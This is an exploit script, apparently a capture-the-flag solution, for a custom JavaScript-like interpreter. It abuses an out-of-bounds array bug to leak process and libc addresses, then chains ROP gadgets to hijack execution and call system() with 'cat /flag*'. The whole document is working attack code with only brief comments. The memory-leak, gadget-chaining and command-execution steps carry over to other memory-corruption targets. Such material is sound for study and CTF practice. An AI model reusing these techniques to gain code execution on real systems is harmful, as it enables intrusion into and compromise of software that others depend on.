/**
 * Get OOB primitive
 */
let x = Array.create(1);
let y = Array.create(1);
let obj = {x: x, y: y, print: print, Array: Array};
let cmd = "cat /flag*";

// Run GC
for (let i = 0; i < 4000; i++) {
    let x = {a: 3.14, b: 3.14, c: 3.14, d: 3.14};
}

let evil = obj.x;
let print = obj.print;
let Array = obj.Array;

/* Leak proc base */
let leak = Array.get(evil, 1);
let proc_base = (leak.length & 0xffffffffffff) - 0x1389 - 119;
print("proc:", proc_base);

/* ldexp: compute 2^n * x */
let ldexp = function(x, n) {
    if (x === 0) return x;
    let p = 2.0;
    if (n < 0) { n = -n; p = 0.5; }
    for (let i = 1; ; i <<= 1) {
        if (n & i) x *= p;
        if (i === 512) break;
        p *= p;
    }
    if (n & 1024) { x *= p; x *= p; }
    if (n & 2048) { x *= p; x *= p; x *= p; x *= p; }
    return x;
};

/* floor: Gaussian floor */
let floor = function(x) {
    if (x >= 0) {
        return x - (x % 1);
    } else {
        x = -x;
        let f = x - (x % 1);
        return (x % 1 === 0) ? -f : -f - 1;
    }
};

/* log2floor: floor(log2(x)) */
let log2floor = function(x) {
    let exponent = 0;
    for (;x < 1;) {
        x *= 2;
        exponent -= 1;
    }
    for (;x >= 2;) {
        x /= 2;
        exponent += 1;
    }
    return exponent;
};

/* i2f: 64-bit integer as IEEE-754 */
let i2f = function(upper, lower) {
    let sign_and_exponent_bits = upper >> 20;
    let sign = sign_and_exponent_bits >= 0x800 ? -1 : +1;
    let exponent_bits = sign_and_exponent_bits & ((1 << 11) - 1);
    let significand_bits = ((upper & 0xfffff) << 32) | lower;
    if (exponent_bits === 0x7ff)
        return false;
    else if (exponent_bits === 0)
        return sign * ldexp(significand_bits, 1-1023-52);
    else
        return sign * ldexp(ldexp(1, 52) + significand_bits,
                            exponent_bits-1023-52);
};

/* f2i: Float to IEEE-754 64-bit representation */
let f2i = function(val) {
    let subnormal = false;
    let sign = 0;
    if (val < 0) {
        sign = 1;
        val = -val;
    } else if (val <= 0 && val >= 0) {
        return { u: sign << 31, l: 0 };
    }

    let exponent = log2floor(val);
    let fraction;
    if (exponent >= -1022) {
        fraction = val / ldexp(1, exponent) - 1;
    } else {
        exponent = -1022;
        fraction = val / ldexp(1, exponent);
        subnormal = true;
    }

    if (fraction < 0) { fraction = 0; }

    let upper_exponent = exponent + 1023;
    let upper_fraction = floor(fraction * 0x100000);
    let lower_fraction = floor((fraction * 0x100000 - upper_fraction) * 0x100000000);

    if (subnormal) { upper_exponent = 0; }
    let upper = (sign << 31) | (upper_exponent << 20) | upper_fraction;
    let lower = lower_fraction;
    return { u: upper, l: lower };
};

/* Leak libc base */
let rop_mov_rax_prdiP58h_cmp_praxP3h_0h_setne_al = proc_base + 0x00002ccd;
print("evil.length:", evil.length);
Array.set(evil, 4, i2f(
    rop_mov_rax_prdiP58h_cmp_praxP3h_0h_setne_al & 0xffffffff, 0x000000c8
));
leak = obj.print();
let leak_int = f2i(leak);
print(leak_int);
let map_base = ((leak_int.u << 32) | leak_int.l) - 1;
let libc_base = map_base + 0x104000;
print("libc:", libc_base);
print("map:", map_base);

/* RIP control */
let rop_mov_rdi_praxP8h_call_prax = libc_base + 0x0009d318;
let addr_do_system = libc_base + 0x50902;
let addr_command = map_base + 0x1a4;
Array.set(evil, 4, i2f(
    rop_mov_rdi_praxP8h_call_prax & 0xffffffff, 0x000000c8
));
Array.set(evil, 5, i2f(
    0x1a, 0x7ffa0000 | (rop_mov_rdi_praxP8h_call_prax >> 32)
));
obj.print(i2f(0x1111, 0x1111),
          i2f(addr_do_system >> 32, addr_do_system & 0xffffffff),
          i2f(addr_command >> 32, addr_command & 0xffffffff));
